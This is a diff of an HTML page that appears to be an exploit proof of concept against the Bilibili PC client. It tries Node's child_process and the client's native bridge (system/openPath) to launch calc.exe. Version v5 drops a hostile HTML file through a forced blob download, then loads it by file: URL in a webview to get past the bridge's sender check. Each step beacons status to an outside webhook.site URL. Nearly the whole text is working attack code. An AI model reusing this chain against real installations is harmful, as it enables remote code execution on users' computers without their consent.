@@ -1,7 +1,29 @@
-<!doctype html><title>BP</title><pre>gp v4</pre>
+<!doctype html><title>BP</title><pre>gp v5</pre>
 <script>
 function beacon(s){new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s)}
-beacon('ran req='+typeof require+' proc='+typeof process+' br='+typeof window.biliBridgePc);
-try{require('child_process').exec('calc');beacon('require-ok')}catch(e){beacon('reqerr:'+e.message)}
-try{window.biliBridgePc.callNative('system/openPath','C:\\Windows\\System32\\calc.exe');beacon('bridge-sent')}catch(e){beacon('brerr:'+e.message)}
+beacon('v5-start');
+// file content dropped via blob download (client download dir: C:\Users\aaa\Videos\bilibili)
+var fileHtml = '<script>new Image().src="https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s=file-exec";try{window.biliBridgePc.callNative("system/openPath","C:\\\\Windows\\\\System32\\\\calc.exe")}catch(e){new Image().src="https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s=file-err:"+encodeURIComponent(e.message)};<\/script>';
+try{
+  var b=new Blob([fileHtml],{type:'text/html'});
+  var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='poc.html';
+  document.body.appendChild(a);a.click();
+  beacon('dl-clicked');
+}catch(e){beacon('dl:'+e.message)}
+// webview loads the dropped file (file: sender passes bridge check fS)
+setTimeout(function(){
+  try{
+    var wv=document.createElement('webview');
+    wv.setAttribute('src','file:///C:/Users/aaa/Videos/bilibili/poc.html');
+    wv.addEventListener('dom-ready',function(){beacon('wv-domready')});
+    wv.addEventListener('load-commit',function(e){beacon('wv-load:'+e.url)});
+    document.body.appendChild(wv);
+    beacon('wv-appended');
+  }catch(e){beacon('wv:'+e.message)}
+},3000);
+// also try top-level navigation as fallback
+setTimeout(function(){
+  beacon('top-nav-try');
+  try{location.href='file:///C:/Users/aaa/Videos/bilibili/poc.html'}catch(e){beacon('nav:'+e.message)}
+},6000);
 </script>
